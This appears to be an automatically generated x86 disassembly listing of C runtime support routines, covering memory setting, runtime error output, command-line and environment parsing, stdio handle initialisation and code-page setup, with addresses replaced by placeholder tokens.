jne r-xdata
mov eax [ esi + 0x34 ]
cmp eax edi
je r-xdata
cmp [ eax + 0xb4 ] edi
jne r-xdata
push eax
call sub_4b66ed
push [ esi + 0x44 ]
call sub_4b66ed
pop ecx
pop ecx
mov eax [ esi + 0x30 ]
cmp eax edi
je r-xdata
cmp [ eax ] edi
jne r-xdata
push eax
call sub_4bc25f
push [ esi + 0x50 ]
call sub_4b66ed
pop ecx
pop ecx
push [ esi + 0x2c ]
call sub_4b66ed
push [ esi + 0x3c ]
call sub_4b66ed
pop ecx
pop ecx
cmp [ eax ] edi
jne r-xdata
cmp eax [ rw-data ]
je r-xdata
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4b66ed
push [ esi + 0x3c ]
call sub_4bc44e
pop ecx
pop ecx
push eax
call sub_4b66ed
push [ esi + 0x3c ]
call sub_4bc3ef
pop ecx
pop ecx
sub_4ba243
push esi
call sub_4b7c13
mov esi eax
mov eax [ esi + 0x64 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x64 ]
pop esi
retn
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov [ esi + 0x64 ] ecx
mov ecx [ rw-data ]
inc [ ecx ]
mov ecx [ rw-data ]
mov ecx [ ecx + 0x2c ]
test ecx ecx
je r-xdata
mov ecx [ eax + 0x2c ]
dec [ eax ]
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x34 ]
test ecx ecx
je r-xdata
inc [ ecx ]
mov ecx [ eax + 0x34 ]
test ecx ecx
je r-xdata
dec [ ecx ]
mov ecx [ rw-data ]
mov ecx [ ecx + 0x30 ]
test ecx ecx
je r-xdata
inc [ ecx ]
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
dec [ ecx ]
mov ecx [ rw-data ]
mov ecx [ ecx + 0x40 ]
test ecx ecx
je r-xdata
inc [ ecx ]
mov ecx [ eax + 0x40 ]
test ecx ecx
je r-xdata
dec [ ecx ]
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4c ]
inc [ ecx + 0xb4 ]
test eax eax
je r-xdata
inc [ ecx ]
mov ecx [ eax + 0x4c ]
dec [ ecx + 0xb4 ]
dec [ ecx ]
cmp [ eax ] 0x0
jne r-xdata
cmp eax rw-data
je r-xdata
push eax
call sub_4ba179
pop ecx
sub_4ba305
push 0xc
push r--data
call sub_4b8944
push 0xc
call sub_4b80da
pop ecx
and [ ebp - 0x4 ] 0x0
call sub_4ba243
mov [ ebp - 0x1c ] eax
or [ ebp - 0x4 ] 0xffffffff
call sub_4ba337
mov eax [ ebp - 0x1c ]
call sub_4b897f
retn
sub_4ba340
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_4ba3a0
push ebp
mov ebp esp
sub esp 0x10c
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
mov ecx [ ebp + 0x8 ]
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor edx edx
push edi
xor eax eax
mov esi eax
shl esi 0x3
cmp ecx [ esi + rw-data ]
jne r-xdata
inc eax
cmp eax 0x12
jb r-xdata
lea esp [ ebp - 0x118 ]
mov ecx [ ebp - 0x4 ]
xor ecx [ ebp + 0x4 ]
call sub_4bb8c9
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
cmp ecx [ eax * 8 + rw-data ]
je r-xdata
push edx
lea eax [ ebp + 0x8 ]
push eax
lea esi [ esi + rw-data ]
push [ esi ]
call sub_4b6ec0
pop ecx
push eax
push [ esi ]
push 0xfffffff4
call [ GetStdHandle@IAT ]
push eax
call [ WriteFile@IAT ]
cmp eax edx
jne r-xdata
cmp ecx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
push 0x104
lea eax [ ebp - 0x10c ]
push eax
push edx
mov [ ebp - 0x8 ] dl
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x10c ]
push eax
lea edi [ ebp - 0x10c ]
call sub_4b6ec0
inc eax
cmp eax 0x3c
pop ecx
jbe r-xdata
lea eax [ ebp - 0x10c ]
push r--data
push eax
call sub_4b7eb0
pop ecx
pop ecx
push edi
call sub_4b6ec0
push [ esi + rw-data ]
mov ebx eax
call sub_4b6ec0
lea eax [ ebx + eax + 0x1c ]
pop ecx
add eax 0x3
pop ecx
and eax 0xfffffffc
call sub_4b6180
mov ebx esp
push r--data
push ebx
call sub_4b7eb0
push edi
push ebx
call sub_4b7ec0
push r--data
push ebx
call sub_4b7ec0
push [ esi + rw-data ]
push ebx
call sub_4b7ec0
push 0x12010
push r--data
push ebx
call sub_4bc7b0
add esp 0x2c
jmp r-xdata
lea eax [ ebp - 0x10c ]
push eax
call sub_4b6ec0
mov edi eax
lea eax [ ebp - 0x10c ]
sub eax 0x3b
push 0x3
add edi eax
push r--data
push edi
call sub_4bc580
add esp 0x10
sub_4ba517
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
push 0xfc
call sub_4ba3a0
mov eax [ rw-data ]
test eax eax
pop ecx
je r-xdata
test eax eax
jne r-xdata
push 0xff
call sub_4ba3a0
pop ecx
call eax
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_4ba550
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
test esi esi
jne r-xdata
call sub_4bb16e
mov al [ esi ]
cmp al 0x22
jne r-xdata
mov esi r--data
jmp r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov al [ esi ]
cmp al 0x22
je r-xdata
mov eax esi
pop esi
retn
mov al [ esi ]
test al al
jne r-xdata
inc esi
cmp [ esi ] 0x20
ja r-xdata
inc esi
test al al
je r-xdata
cmp al 0x20
ja r-xdata
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
movzx eax al
push eax
call sub_4bc8da
test eax eax
pop ecx
je r-xdata
jmp r-xdata
inc esi
mov al [ esi ]
cmp al 0x22
jne r-xdata
inc esi
sub_4ba5b9
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi [ rw-data ]
xor edi edi
cmp esi ebx
jne r-xdata
call sub_4bb16e
mov al [ esi ]
cmp al bl
jne r-xdata
jmp r-xdata
cmp al 0x3d
je r-xdata
lea eax [ edi * 4 + 0x4 ]
push eax
call sub_4b66db
mov edi eax
cmp edi ebx
pop ecx
mov [ rw-data ] edi
jne r-xdata
or eax 0xffffffff
jmp r-xdata
push esi
call sub_4b6ec0
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebp
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi ] bl
jne r-xdata
push esi
call sub_4b6ec0
mov ebp eax
inc ebp
cmp [ esi ] 0x3d
pop ecx
je r-xdata
push [ rw-data ]
call sub_4b66ed
mov [ rw-data ] ebx
mov [ edi ] ebx
mov [ rw-data ] 0x1
xor eax eax
add esi ebp
push ebp
call sub_4b66db
cmp eax ebx
pop ecx
mov [ edi ] eax
je r-xdata
push [ rw-data ]
call sub_4b66ed
mov [ rw-data ] ebx
or eax 0xffffffff
jmp r-xdata
push esi
push eax
call sub_4b7eb0
pop ecx
pop ecx
add edi 0x4
pop ecx
pop ebp
sub_4ba680
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0xc ]
xor edx edx
cmp [ ebp + 0x8 ] edx
push edi
mov [ esi ] edx
mov edi ecx
mov [ ebx ] 0x1
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
mov ecx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ecx ] edi
inc [ esi ]
test edi edi
je r-xdata
xor ecx ecx
test edx edx
sete cl
inc eax
mov edx ecx
mov cl 0x22
jmp r-xdata
mov cl [ eax ]
movzx ebx cl
inc eax
test [ ebx + rw-data ] 0x4
je r-xdata
mov cl [ eax ]
mov [ edi ] cl
inc edi
test edx edx
jne r-xdata
test cl cl
mov ebx [ ebp + 0xc ]
je r-xdata
inc [ esi ]
test edi edi
je r-xdata
cmp cl 0x20
je r-xdata
dec eax
jmp r-xdata
inc eax
mov bl [ eax ]
mov [ edi ] bl
inc edi
test edi edi
je r-xdata
cmp cl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
and [ edi - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov cl [ eax ]
cmp cl 0x20
je r-xdata
inc [ ebx ]
pop edi
pop ebx
leave
retn
and [ eax ] 0x0
inc eax
jmp r-xdata
cmp cl 0x9
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ebx ]
mov ecx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ecx ] edi
cmp [ eax ] 0x5c
je r-xdata
inc eax
inc edx
cmp [ eax ] 0x22
jne r-xdata
test edx edx
je r-xdata
test dl 0x1
jne r-xdata
mov cl [ eax ]
test cl cl
je r-xdata
test edi edi
je r-xdata
shr edx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ esi ]
dec edx
jne r-xdata
mov [ edi ] 0x5c
inc edi
xor ebx ebx
lea ecx [ eax + 0x1 ]
cmp [ ecx ] 0x22
jne r-xdata
inc [ esi ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
and [ edi ] 0x0
inc edi
test ebx ebx
je r-xdata
cmp cl 0x20
je r-xdata
mov eax ecx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
inc eax
jmp r-xdata
test edi edi
je r-xdata
cmp cl 0x9
je r-xdata
xor ecx ecx
cmp [ ebp - 0x4 ] ecx
sete cl
mov [ ebp - 0x4 ] ecx
xor ebx ebx
inc ebx
xor edx edx
jmp r-xdata
movzx ecx cl
test [ ecx + rw-data ] 0x4
je r-xdata
movzx edx cl
test [ edx + rw-data ] 0x4
je r-xdata
inc [ esi ]
inc eax
inc [ esi ]
mov cl [ eax ]
mov [ edi ] cl
inc edi
jmp r-xdata
mov [ edi ] cl
inc edi
inc eax
inc [ esi ]
sub_4ba7ec
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
and [ rw-data ] 0x0
push 0x104
mov esi rw-data
push esi
push edi
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
cmp eax edi
mov [ rw-data ] esi
je r-xdata
call sub_4bb16e
mov ebx esi
cmp [ eax ] 0x0
mov ebx eax
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ esi + edi ]
push edi
lea esi [ ebp - 0x8 ]
mov eax ebx
call sub_4ba680
mov eax [ ebp - 0x4 ]
dec eax
pop ecx
mov [ rw-data ] eax
pop ecx
mov [ rw-data ] edi
xor eax eax
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push edi
lea esi [ ebp - 0x8 ]
xor ecx ecx
mov eax ebx
call sub_4ba680
mov esi [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
shl esi 0x2
add eax esi
push eax
call sub_4b66db
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_4ba88e
push ecx
push ecx
mov eax [ rw-data ]
push ebx
push ebp
push esi
push edi
mov edi [ GetEnvironmentStringsW@IAT ]
xor ebx ebx
xor esi esi
cmp eax ebx
push 0x2
pop ebp
jne r-xdata
cmp eax 0x1
jne r-xdata
call edi
mov esi eax
cmp esi ebx
je r-xdata
cmp eax ebp
je r-xdata
cmp esi ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
call [ GetEnvironmentStrings@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
cmp eax ebx
je r-xdata
cmp [ esi ] bx
mov eax esi
je r-xdata
call edi
mov esi eax
cmp esi ebx
je r-xdata
mov eax [ rw-data ]
mov eax ebp
mov [ rw-data ] eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ esi ] bl
je r-xdata
mov edi [ WideCharToMultiByte@IAT ]
push ebx
push ebx
push ebx
sub eax esi
push ebx
sar eax 0x1
inc eax
push eax
push esi
push ebx
push ebx
mov [ esp + 0x34 ] eax
call edi
mov ebp eax
cmp ebp ebx
je r-xdata
add eax ebp
cmp [ eax ] bx
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
sub eax esi
inc eax
mov ebp eax
push ebp
call sub_4b66db
mov edi eax
cmp edi ebx
pop ecx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push esi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push ebp
call sub_4b66db
cmp eax ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
add eax ebp
cmp [ eax ] bx
jne r-xdata
push ebp
push esi
push edi
call sub_4b6f50
add esp 0xc
xor edi edi
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push ebx
push ebx
push ebp
push eax
push [ esp + 0x24 ]
push esi
push ebx
push ebx
call edi
test eax eax
jne r-xdata
push esi
call [ FreeEnvironmentStringsA@IAT ]
mov eax edi
mov ebx [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_4b66ed
pop ecx
mov [ esp + 0x10 ] ebx
sub_4ba9b0
sub esp 0x48
push ebx
mov ebx 0x480
push ebx
call sub_4b66db
test eax eax
pop ecx
jne r-xdata
mov [ rw-data ] eax
mov [ rw-data ] 0x20
lea ecx [ eax + 0x480 ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
cmp eax ecx
jb r-xdata
pop ebx
add esp 0x48
retn
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
and [ eax + 0x8 ] 0x0
mov [ eax + 0x5 ] 0xa
mov ecx [ rw-data ]
add eax 0x24
add ecx 0x480
push ebp
push esi
push edi
lea eax [ esp + 0x14 ]
push eax
call [ GetStartupInfoA@IAT ]
cmp [ esp + 0x46 ] 0x0
je r-xdata
xor ebx ebx
mov eax [ esp + 0x48 ]
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x80
test ebx ebx
mov [ esi + 0x4 ] 0x81
jne r-xdata
mov edi [ eax ]
lea ebp [ eax + 0x4 ]
lea eax [ edi + ebp ]
mov [ esp + 0x10 ] eax
mov eax 0x800
cmp edi eax
jl r-xdata
mov ecx [ rw-data ]
lea eax [ ebx + ebx * 8 ]
lea esi [ ecx + eax * 4 ]
cmp [ esi ] 0xffffffff
jne r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
cmp [ rw-data ] edi
jge r-xdata
mov edi eax
or [ esi + 0x4 ] 0x40
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
xor ebx ebx
test edi edi
jle r-xdata
mov esi rw-data
inc ebx
cmp ebx 0x3
jl r-xdata
and eax 0xff
cmp eax 0x2
mov [ esi ] edi
jne r-xdata
mov eax [ esp + 0x10 ]
mov eax [ eax ]
cmp eax 0xffffffff
je r-xdata
mov edi [ rw-data ]
add [ rw-data ] 0x20
mov [ esi ] eax
lea ecx [ eax + 0x480 ]
jmp r-xdata
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
add [ esp + 0x10 ] 0x4
inc ebx
inc ebp
cmp ebx edi
jl r-xdata
mov cl [ ebp ]
test cl 0x1
je r-xdata
cmp eax ecx
jb r-xdata
lea eax [ esi + 0xc ]
push 0xfa0
push eax
call sub_4bb19c
test eax eax
pop ecx
pop ecx
je r-xdata
or [ esi + 0x4 ] 0x8
test cl 0x8
jne r-xdata
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
and [ eax + 0x8 ] 0x0
mov [ eax + 0x5 ] 0xa
mov ecx [ esi ]
add eax 0x24
add ecx ebx
add esi 0x4
cmp [ rw-data ] edi
jl r-xdata
or eax 0xffffffff
jmp r-xdata
inc [ esi + 0x8 ]
jmp r-xdata
mov ecx ebx
mov eax ebx
and eax 0x1f
lea eax [ eax + eax * 8 ]
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
lea esi [ ecx + eax * 4 ]
mov eax [ esp + 0x10 ]
mov eax [ eax ]
mov [ esi ] eax
mov al [ ebp ]
mov [ esi + 0x4 ] al
lea eax [ esi + 0xc ]
push 0xfa0
push eax
call sub_4bb19c
test eax eax
pop ecx
pop ecx
je r-xdata
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push ebx
call sub_4b66db
test eax eax
pop ecx
je r-xdata
jmp r-xdata
pop edi
pop esi
pop ebp
inc [ esi + 0x8 ]
sub_4babae
push 0xc
push r--data
call sub_4b8944
mov [ ebp - 0x1c ] r--data
call sub_4b897f
retn
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
jmp r-xdata
cmp [ ebp - 0x1c ] r--data
jae r-xdata
sub_4babf2
push 0xc
push r--data
call sub_4b8944
mov [ ebp - 0x1c ] r--data
call sub_4b897f
retn
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
jmp r-xdata
cmp [ ebp - 0x1c ] r--data
jae r-xdata
sub_4bac23
mov esp [ ebp - 0x18 ]
cmp [ ebp - 0x1c ] r--data
jae r-xdata
call sub_4b897f
retn
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
jmp r-xdata
sub_4bac9e
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_4baccd
push edi
push 0x40
xor eax eax
pop ecx
mov edi rw-data
[ edi ]
stosb [ edi ]
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov edi rw-data
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
pop edi
retn
sub_4bacf6
push ebp
mov ebp esp
sub esp 0x518
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
push esi
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x18 ]
push eax
push [ rw-data ]
call [ GetCPInfo@IAT ]
cmp eax 0x1
mov esi 0x100
jne r-xdata
xor eax eax
xor eax eax
cmp eax 0x61
jb r-xdata
cmp eax 0x5a
ja r-xdata
mov [ ebp + eax - 0x118 ] al
inc eax
cmp eax esi
jb r-xdata
mov al [ ebp - 0x12 ]
test al al
mov [ ebp - 0x118 ] 0x20
je r-xdata
and [ eax + rw-data ] 0x0
cmp eax 0x7a
ja r-xdata
or [ eax + rw-data ] 0x10
mov cl al
add cl 0x20
push 0x0
push [ rw-data ]
lea eax [ ebp - 0x518 ]
push [ rw-data ]
push eax
push esi
lea eax [ ebp - 0x118 ]
push eax
push 0x1
call sub_4bc0a5
push 0x0
push [ rw-data ]
lea eax [ ebp - 0x218 ]
push esi
push eax
push esi
lea eax [ ebp - 0x118 ]
push eax
push esi
push [ rw-data ]
call sub_4bca92
push 0x0
push [ rw-data ]
lea eax [ ebp - 0x318 ]
push esi
push eax
push esi
lea eax [ ebp - 0x118 ]
push eax
push 0x200
push [ rw-data ]
call sub_4bca92
add esp 0x5c
xor eax eax
push ebx
lea edx [ ebp - 0x11 ]
push edi
cmp eax 0x41
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx [ ebp + 0x4 ]
pop esi
call sub_4bb8c9
leave
retn
or [ eax + rw-data ] 0x20
mov cl al
sub cl 0x20
jmp r-xdata
inc eax
cmp eax esi
jb r-xdata
test cl 0x2
je r-xdata
or [ eax + rw-data ] 0x10
mov cl [ ebp + eax - 0x218 ]
inc edx
mov al [ edx ]
inc edx
test al al
jne r-xdata
sub ecx eax
inc ecx
mov ebx ecx
shr ecx 0x2
lea edi [ ebp + eax - 0x118 ]
mov eax 0x20202020
[ edi ]
mov ecx ebx
and ecx 0x3
[ edi ]
mov [ eax + rw-data ] cl
jmp r-xdata
and [ eax + rw-data ] 0x0
or [ eax + rw-data ] 0x20
mov cl [ ebp + eax - 0x318 ]
jmp r-xdata
inc eax
cmp eax esi
jb r-xdata
movzx ecx [ edx ]
movzx eax al
cmp eax ecx
ja r-xdata
pop edi
pop ebx
mov cx [ ebp + eax * 2 - 0x518 ]
test cl 0x1
je r-xdata
jmp r-xdata
mov [ eax + rw-data ] cl
jmp r-xdata
sub_4bae88
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp esi ebx
mov [ ebp - 0x4 ] eax
push edi
je r-xdata
call sub_4baccd
xor edx edx
xor eax eax
mov ecx [ ebp - 0x4 ]
xor ecx [ ebp + 0x4 ]
pop edi
pop esi
pop ebx
call sub_4bb8c9
leave
retn
push 0x40
xor eax eax
pop ecx
mov edi rw-data
[ edi ]
lea ecx [ edx + edx * 2 ]
shl ecx 0x4
mov [ ebp - 0x8 ] ebx
stosb [ edi ]
lea ebx [ ecx + rw-data ]
add eax 0x30
inc edx
cmp eax 0xf0
jb r-xdata
test al al
jne r-xdata
cmp [ eax + rw-data ] esi
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
push esi
call [ GetCPInfo@IAT ]
cmp eax 0x1
jne r-xdata
mov dl [ esi + 0x1 ]
test dl dl
je r-xdata
inc [ ebp - 0x8 ]
add ebx 0x8
cmp [ ebp - 0x8 ] 0x4
jb r-xdata
cmp [ rw-data ] ebx
je r-xdata
push 0x40
xor eax eax
cmp [ ebp - 0x1c ] 0x1
pop ecx
mov edi rw-data
[ edi ]
stosb [ edi ]
mov [ rw-data ] esi
mov [ rw-data ] ebx
jbe r-xdata
movzx eax al
movzx edi dl
cmp eax edi
ja r-xdata
mov al [ ebx ]
mov esi ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] 0x1
call sub_4bac9e
lea ecx [ ecx + rw-data ]
mov esi ecx
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ rw-data ] eax
movsd [ edi ] [ esi ]
jmp r-xdata
or eax 0xffffffff
mov [ rw-data ] ebx
cmp [ ebp - 0x16 ] 0x0
je r-xdata
inc esi
inc esi
mov al [ esi ]
mov edx [ ebp - 0x8 ]
mov dl [ edx + rw-data ]
call sub_4bacf6
xor eax eax
jmp r-xdata
xor ecx ecx
inc ecx
mov eax ecx
lea ecx [ ebp - 0x15 ]
or [ eax + rw-data ] dl
inc eax
cmp eax edi
jbe r-xdata
or [ eax + rw-data ] 0x8
inc eax
cmp eax 0xff
jb r-xdata
mov eax esi
call sub_4bac9e
mov [ rw-data ] eax
mov [ rw-data ] ecx
jmp r-xdata
movzx eax [ ecx - 0x1 ]
movzx edx dl
jmp r-xdata
xor eax eax
mov edi rw-data
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax edx
jbe r-xdata
or [ eax + rw-data ] 0x4
inc eax
inc ecx
inc ecx
cmp [ ecx - 0x1 ] 0x0
jne r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
sub_4bb01e
push 0x14
push r--data
call sub_4b8944
or [ ebp - 0x1c ] 0xffffffff
push 0xd
call sub_4b80da
pop ecx
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ rw-data ] edi
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
jmp r-xdata
cmp eax 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
mov [ ebp + 0x8 ] eax
cmp eax [ rw-data ]
je r-xdata
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x1c ] edi
mov esi [ rw-data ]
mov [ ebp - 0x20 ] esi
cmp esi edi
je r-xdata
push 0x220
call sub_4b66db
pop ecx
mov esi eax
mov [ ebp - 0x20 ] esi
cmp [ esi ] edi
je r-xdata
cmp [ ebp - 0x1c ] 0xffffffff
jne r-xdata
push [ ebp + 0x8 ]
call sub_4bae88
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax edi
jne r-xdata
cmp esi edi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_4bb165
mov eax [ ebp - 0x1c ]
call sub_4b897f
retn
cmp esi [ rw-data ]
je r-xdata
mov [ esi ] edi
mov eax [ rw-data ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
mov [ esi + 0x8 ] eax
mov eax [ rw-data ]
mov [ esi + 0xc ] eax
xor eax eax
push esi
call sub_4b66ed
pop ecx
jmp r-xdata
xor eax eax
mov cx [ eax * 2 + rw-data ]
mov [ esi + eax * 2 + 0x10 ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + rw-data ]
mov [ eax + esi + 0x1c ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x24 ] eax
cmp eax 0x5
jge r-xdata
mov [ rw-data ] esi
mov cl [ eax + rw-data ]
mov [ eax + esi + 0x11d ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x24 ] eax
cmp eax 0x101
jge r-xdata
mov [ ebp - 0x24 ] eax
cmp eax 0x100
jge r-xdata
sub_4bb19c
push 0x10
push r--data
call sub_4b8944
mov eax [ rw-data ]
test eax eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
cmp [ rw-data ] 0x1
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_4b897f
retn
mov eax sub_4bb18c
mov [ rw-data ] eax
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
test eax eax
jne r-xdata
sub_4bb227
call sub_4b7c13
mov eax [ eax + 0x64 ]
cmp eax [ rw-data ]
je r-xdata
cmp [ eax + 0x28 ] 0x1
jle r-xdata
call sub_4ba305
mov eax [ eax + 0x48 ]
mov ecx [ esp + 0x4 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
retn
push 0x4
push [ esp + 0x8 ]
push eax
call sub_4ba102
add esp 0xc
retn
sub_4bb261
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x14 ] 0x0
push edi
je r-xdata
cmp ebx 0x41
jl r-xdata
cmp [ esi + 0x24 ] 0x0
je r-xdata
mov eax ebx
cmp ebx 0x5a
lea eax [ ebx + 0x20 ]
jle r-xdata
xor edi edi
inc edi
cmp ebx 0x100
jae r-xdata
cmp ebx 0x7f
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov edx [ esi + 0x48 ]
mov eax ebx
sar eax 0x8
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je r-xdata
cmp [ esi + 0x28 ] edi
jle r-xdata
and [ ebp + 0x9 ] 0x0
mov [ ebp + 0x8 ] bl
mov eax edi
and [ ebp + 0xa ] 0x0
push 0x2
mov [ ebp + 0x8 ] al
mov [ ebp + 0x9 ] bl
pop eax
jmp r-xdata
mov eax [ esi + 0x48 ]
movzx eax [ eax + ebx * 2 ]
and eax edi
push edi
push ebx
push esi
call sub_4ba102
add esp 0xc
jmp r-xdata
cmp eax edi
jne r-xdata
push edi
push [ esi + 0x4 ]
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0x8 ]
push eax
push 0x100
push [ esi + 0x14 ]
call sub_4bca92
add esp 0x20
test eax eax
je r-xdata
test eax eax
je r-xdata
movzx ecx [ ebp - 0x3 ]
xor eax eax
mov ah [ ebp - 0x4 ]
or eax ecx
jmp r-xdata
movzx eax [ ebp - 0x4 ]
jmp r-xdata
sub_4bb34b
mov eax [ esp + 0x8 ]
push 0x20
pop ecx
cdq
idiv ecx
push 0x1f
pop ecx
sub ecx edx
or edx 0xffffffff
shl edx cl
mov ecx [ esp + 0x4 ]
not edx
test [ ecx + eax * 4 ] edx
je r-xdata
inc eax
cmp eax 0x3
jl r-xdata
xor eax eax
retn
